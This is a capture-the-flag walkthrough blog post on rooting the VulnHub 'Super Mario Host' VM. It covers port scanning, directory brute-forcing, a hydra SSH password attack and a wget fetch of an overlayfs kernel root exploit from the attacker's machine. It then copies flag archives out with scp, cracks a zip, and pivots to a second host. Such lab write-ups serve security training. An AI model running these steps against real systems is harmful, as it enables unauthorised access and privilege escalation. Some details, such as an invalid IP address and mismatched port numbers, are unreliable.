<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Super Mario (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-super-mario-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-06-07T15:33:32+00:00">June 7, 2017</time><time class="updated" datetime="2025-06-10T20:30:12+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Might you people have played THE SUPER MARIO game once in your childhood and no wonder if a thought has been a strike in your mind to hack the game. So whatever you had thought today we are going to make it true and for that, you guys need to download the new VM machine for super Mario from <a style="color: #000000;" href="https://download.vulnhub.com/supermariohost/Super-Mario-Host-v1.0.1.ova.torrent"><strong>here</strong></a>.</span></p>
<p><span style="color: #000000;">The credit for developing this VM machine is going to Mr_h4sh who has hidden 2 flags inside this lab as a challenge for hackers. The level of the challenge is Intermediate.</span></p>
<p><span style="color: #000000;"><strong>Let’s breach!!!</strong></span></p>
<p><span style="color: #000000;"><strong> </strong>As you know we always start with enumeration, therefore open the terminal in your Kali Linux and go for an aggressive scan with nmap.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.0.5</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-r16egcT_lOQ/WTgYFGOmkyI/AAAAAAAAQL4/CauSLk3NrKshvrxsuY4LnSDIrqZ4mKFKwCLcB/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Since port 22 and port 8180 for service SSH and HTTP respectively, therefore, I choose port 8081 for enumeration but from screenshot, you can see I didn’t get any remarkable result.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-21cIC3Pg72k/WTgYF90Z1jI/AAAAAAAAQMA/9F5Ab0mGqBIUv-5uFklps1hLPlsIyy3gQCEw/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Then I move for directory brute force attack using the following command</span></p>
<pre class="lang:default decode:true">dirb http://192.168.0.5:8180 /usr/share/wordlists/dirb/big.txt</pre>
<p><span style="color: #000000;">In the given below screenshot, you can read it has shown a file name <strong>vhosts,</strong> let’s explore it through a browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-2pUH_INJLLM/WTgYF9B9ILI/AAAAAAAAQME/aJlyeRyVD6oQpvZrZ3B-wNMQiomqIUMmgCEw/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now explore vhosts in URL as  <strong>http://192.168.0.5:8180/vhosts</strong> here vhosts stand for the virtual host it is a method for hosting multiple domains on a single server. From inside Vhosts, I came to know the Server Name is <strong>mario.supermariohost.local</strong>  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-i7rqJDVHE9Q/WTgYGNRChEI/AAAAAAAAQMI/2bFy06hcCxQcmTirsFIdELas6Y7B-FFVACEw/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Let’s add mario.supermariohost.local into /etc as new localhost</span></p>
<pre class="lang:default decode:true">cd etc
vim hosts</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-4AmhUWCbfqM/WTgYGgx5BaI/AAAAAAAAQMM/lgaGUQghevodUrgdh2CzXoQKvoQLf-llACEw/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now type “<strong>192.168.0.5 mario.supermariohost.local”</strong> inside the vim editor to add it in the /etc/host and after then type <strong>wq</strong> to save it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--RYSg5tbj1Y/WTgYGuV6GQI/AAAAAAAAQMQ/YX_m8VuksUUT66gUCUSYcESEH4atsuJwgCEw/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now Type <strong>cat hosts</strong> to check added hostname Hence you from the screenshot you can see it has been had added inside it successfully.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-47hB9JKrG9o/WTgYHAIzcRI/AAAAAAAAQMU/KzffS4qjUsM5XMgEFNijLyDSO89JF2lUwCEw/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Then I visit <strong>mario.supermariohost.local</strong> on the browser and finally got Mario as a browser game but it is not working.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_XNcGz0z-R0/WTgYHvlMD_I/AAAAAAAAQMc/h4Ppc3KtSN4Ca2ODZLK0nx1k9KSHwOPbQCEw/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Since we know port 22 and 8081 was open and we didn’t get much information from the enumeration of port 8081. Now we will move towards port 22 for SSH enumeration, therefore, I had prepared a dictionary in order to retrieve credential to login inside the SSH server. </span></p>
<p><span style="color: #000000;">Dictionary contains username which was the famous character of MARIO, you can check these name from Google also.</span></p>
<p><span style="color: #000000;">Inside text editor type following name: <strong>Mario; luigi; peach; toad; yoshi</strong> and save the file as <strong>a user</strong> on the desktop.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-cLaHtN7UjW4/WTgYHeaAbYI/AAAAAAAAQMY/WG19be29jDI_1thn-sWSSZEODbhKSrsOQCEw/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Use john the ripper to generate a dictionary of the password using the following command here –<strong>rules</strong> will enable the wordlist and <strong>–stdout</strong> will define a fixed length of the password to be generated on the desktop as <strong>pass.</strong></span></p>
<pre class="lang:default decode:true">john --wordlist:user --rules --stdout &gt; pass</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LZ6jndG81H0/WTgYFGE8wpI/AAAAAAAAQL0/Plj4OP7zOLEJx0V2jZA0LA96SPGanuhXwCEw/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Finally, we have username dictionary as <strong>user</strong> and password dictionary generated by John as <strong>pass</strong>, now we have to match the perfect combination of user and pass in order to retrieve credential for SSH login. I had chosen hydra for password cracking, you can choose any other password cracking tool also.</span></p>
<pre class="lang:default decode:true">hydra -L user -P pass 192.168.0.5 ssh</pre>
<p><span style="color: #000000;">From the given screenshot you read the matched combination of username:<strong> luigi</strong> and password: <strong>luigi1</strong> for the SSH server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sI609dP7AO0/WTgYE2PgwUI/AAAAAAAAQMg/lbpu68i9b1knLAe-nLrQcAm5Q8c4hPJPgCEw/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now type following for SSH login</span></p>
<pre class="lang:default decode:true">ssh luigi@192.168.0.5</pre>
<p><span style="color: #000000;"><strong>Password</strong></span></p>
<pre class="lang:default decode:true">luigi1</pre>
<p><span style="color: #000000;"><strong>Yeeppiii!!!!</strong>  Finally, we have login inside the SSH server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-jHJ4cG2xthA/WTgYFRGlr6I/AAAAAAAAQMg/CDJOpmo1TVEPt8dzmC1wF7pnhQXNTnihQCEw/s1600/12.png"/></span></p>
<pre class="lang:default decode:true">uname -a</pre>
<p><span style="color: #000000;">Here we come to know that the version for Linux supermariohost <strong>3.13.0</strong>; let’s check out its exploit on Google.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4YRLe0JfGWY/WTgYxHBFwdI/AAAAAAAAQMs/Thdv8ZIX8kohEtPQ866ZtqmuHeqfYdOrgCLcB/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Yes, there is an exploit for 3.13.0 overlayfs local root in Ubuntu, <strong>download</strong> it from <a style="color: #000000;" href="https://www.exploit-db.com/download/37292"><strong>here</strong></a> inside your Kali Linux.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aeX_F4S-Lds/WTgYw0JtgNI/AAAAAAAAQMo/SZABgWywpuwQd78yutPK5qTARlNj0jSqACEw/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Form screenshot you can see I have downloaded the exploit as <strong>Mario.c</strong> for privilege escalation. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gbAlOezTfVY/WTgYwx-i-DI/AAAAAAAAQMk/R7aIdnMetJk3xrEcdcLSfx3YEWcoWHmVgCEw/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now type the following command for downloading Mario.c inside target system.</span></p>
<pre class="lang:default decode:true">wget http://192.168.0.6/mario.c</pre>
<p><span style="color: #000000;">The file is successfully downloaded inside it now type another command to compile Mario.c</span></p>
<pre class="lang:default decode:true">gcc mario.c -o mario</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zk2Aypf8XsY/WTgYxo0ObvI/AAAAAAAAQMw/j6b9ev0AO3UTlnOc2YSQcE8nNFN4_MgAACEw/s1600/16.png"/></span></p>
<pre class="lang:default decode:true">./mario
id
cd /root
ls</pre>
<p><span style="color: #000000;"><strong>Awesome!!!</strong> We have got root privilege and from the screenshot, you can see inside its directory I have got zip file as <strong>flag.zip</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HiwcYbz-vxo/WTgYx93i38I/AAAAAAAAQM4/J3i9tqTwVQkKwUzyjTQZEZkitZpo10YmQCEw/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now type the following command to download flag.zip on the desktop of your Kali Linux</span></p>
<pre class="lang:default decode:true">scp /root/flag.zip root@192.168.0.6:/root/Desktop</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-FMjeesvs3kk/WTgYxl46b3I/AAAAAAAAQM0/x5HoHk9xc603htC_xTS3YZ6ZT37JWZRCwCEw/s1600/18.png"/></span></p>
<pre class="lang:default decode:true ">fcrackzip flag.zip -D -P /user/share/wordlist/rockyou.txt -u</pre>
<p><span style="color: #000000;">As shown in the given screenshot PASSWORD FOUND!!! : <strong>pw == ilovepeach</strong>; now you can unzip your file using this password.</span></p>
<pre class="lang:default decode:true">unzip flag.zip</pre>
<p><span style="color: #000000;">It will ask for a password, give above password to unzip it and again if you notice the given image it contains <strong>flag.txt</strong></span></p>
<pre class="lang:default decode:true">cat flag.txt</pre>
<p><span style="color: #000000;"><strong>1<sup>st</sup> FLAG: </strong>Well done: D If you reached this it means you got root, congratulations.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/--H480ev1GLU/WTgYyfU-w7I/AAAAAAAAQNA/kxOV3ivDk4cTrRjurlwuNMrPHDe6siamACEw/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now follow the given below step in order to complete another challenge.</span></p>
<pre class="lang:default decode:true">iptables -L</pre>
<p><span style="color: #000000;">Here from the screenshot, you can see a new network has been added on the remote system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-cyMFWE14R4I/WTgYyljgUKI/AAAAAAAAQNE/82DsILoXs2A3BSHiSBOj85uFBfFK8S-bwCEw/s1600/21.png"/></span></p>
<pre class="lang:default decode:true">arp -n</pre>
<p><span style="color: #000000;">Now the target system has been forwarded on a new IP <strong>192.168.122.112</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-X8X9rJ0JzxE/WTgYy08GPoI/AAAAAAAAQNU/D-hUZJ9h1LYHcPuLmDTXVOu4ouT6VqWlwCEw/s1600/22.png"/></span></p>
<pre class="lang:default decode:true">ls -la</pre>
<p><span style="color: #000000;">Found a directory <strong>.bak</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-9zR6DtsH4PU/WTgYzYcjKwI/AAAAAAAAQNU/4v4FBjMMEKExh46CjKanSkS2Dsym7R8LQCEw/s1600/23.png"/></span></p>
<pre class="lang:default decode:true">cd /.bak
ls
cd users
cd luigi
ls</pre>
<p><span style="color: #000000;">There are two files inside it let’s read them one by one</span></p>
<pre class="lang:default decode:true">cat message</pre>
<p><span style="color: #000000;">Hi Luigi,</span></p>
<p><span style="color: #000000;">Since you’ve been messing around with my host, at this point I want to return the favor. This is a “war”, you “naughty” boy!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-hAD6jKkxu1Y/WTgYzai6MYI/AAAAAAAAQNU/QLWVykgcWKk6cIyoShvs1nqIWscFH3izwCEw/s1600/24.png"/></span></p>
<pre class="lang:default decode:true">cat id_rsa.pub</pre>
<p><span style="color: #000000;">The highlighted word in the given text may appear like username for login into an SSH server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-SceBXYjU8WE/WTgZrGe-K6I/AAAAAAAAQNc/51x_MHdELfojG-UVNfBkRwqnyyPRYAcRACLcB/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Let ensure by login into</span></p>
<pre class="lang:default decode:true">ssh -i id_rsa warluigi@192.168.1.122.112</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-3m2VqwBbZh4/WTgZrCcytKI/AAAAAAAAQNY/TqFg9Erci-YYPDyXAbFd84nXdaljyTm9wCEw/s1600/26.png"/></span></p>
<p><span style="color: #000000;"><strong>Great!!</strong> All assumption had given the positive result</span></p>
<p><span style="color: #000000;">Again check for kernel version</span></p>
<pre class="lang:default decode:true">uname -a</pre>
<p><span style="color: #000000;"><strong>Woooww!! </strong>It is the same version now we can use our Mario.c exploit for root privilege. Hence repeat the above step as shown in images.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ErEARbfSphc/WTgZrCTsf8I/AAAAAAAAQNg/ZvpLqZZta94IP_DnFRktKGad5ra1-bNWQCEw/s1600/27.png"/></span></p>
<pre class="lang:default decode:true">wget http://192.168.0.6/mario.c</pre>
<p><span style="color: #000000;">The file is successfully downloaded inside it now type another command to compile Mario.c</span></p>
<pre class="lang:default decode:true">gcc mario.c -o mario</pre>
<pre class="lang:default decode:true">./mario</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2lydeI9yXhE/WTgZroXxaKI/AAAAAAAAQNk/mJ18eFGyS6UqBOcPN-S199f4UyRTPUmlgCEw/s1600/28.png"/></span></p>
<pre class="lang:default decode:true">id
cd /root
ls -la</pre>
<p><span style="color: #000000;">Here I found two important files 1<sup>st</sup> <strong>hint.txt</strong> 2<sup>nd</sup> <strong>flag2.zip</strong> before going for unzipping flag.zip we must look towards hint.txt file.</span></p>
<p><span style="color: #000000;"><strong>cat .hint.txt </strong></span></p>
<p><span style="color: #000000;">“<strong>Peach Loves Me</strong>” it might be the password key for decrypting the flag2.zip file </span></p>
<p><span style="color: #000000;">Now let download flag2.zip on the desktop of Kali Linux by using following again</span></p>
<pre class="lang:default decode:true">scp /root/flag2.zip root@192.168.0.6:/root/Desktop</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-EbyqQFbHuAA/WTgZryxklsI/AAAAAAAAQNo/68hgYyG09UsMeC-Wt7sRS5xpK9x7tQXEQCEw/s1600/29.png"/></span></p>
<pre class="lang:default decode:true">unzip flag2.zip</pre>
<p><span style="color: #000000;">Now when it will ask for password key type “<strong>Peach Loves Me</strong>”</span></p>
<p><span style="color: #000000;">It contains flag2.txt inside type <strong>cat flag2.txt</strong> to open this file.</span></p>
<p><span style="color: #000000;"><strong>2<sup>nd</sup> FLAG:</strong> Congratulations on your second flag!</span></p>
<p><span style="color: #000000;"> <strong>Wonderful!!! We have caught both flags</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-QyRS9OpJ_Gs/WTgZr4rWmbI/AAAAAAAAQNs/2TkZnOrshSEd3P01hyKEqFT_z15qr0I7wCEw/s1600/30.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Vishva Vaghela is a Digital Forensics enthusiast and enjoys technical content writing. You can reach her on</span><strong><a href="https://www.linkedin.com/in/vishva-vaghela-979446191/"> Here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
